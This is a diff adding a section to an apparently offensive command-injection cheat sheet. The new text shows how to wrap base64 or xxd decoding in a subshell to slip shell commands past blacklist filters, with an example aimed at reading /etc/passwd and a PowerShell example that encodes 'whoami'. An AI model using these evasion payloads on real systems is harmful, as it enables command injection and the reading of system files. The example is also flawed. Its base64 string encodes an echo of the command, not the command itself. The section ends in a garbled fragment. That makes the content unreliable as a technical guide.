@@ -159,4 +159,16 @@ whoami | $(rev<<<'imaohw')
 Syntax: $(rev<<<'<reversedcommand>')
 ```
 
-Encoded Command:
+Encoded Command (Linux and Windows):
+
+If subshell `$()` is not blacklisted, we can utilize it to decode encoded commands to bypass encoded filter, we can use either base64 or xxd, below is the example:
+```
+echo -n 'cat /etc/passwd' | base64 #or xxd if we use xxd encoding
+bash<<<$(base64 -d<<<ZWNobyAtbiAnY2F0IC9ldGMvcGFzc3dkJw==) #Actual payload with previous base64 encoding
+```
+Windows Version:
+```
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+ResultingString: dwBoAG8AYQBtAGkA
+(Archiving abov)
+```
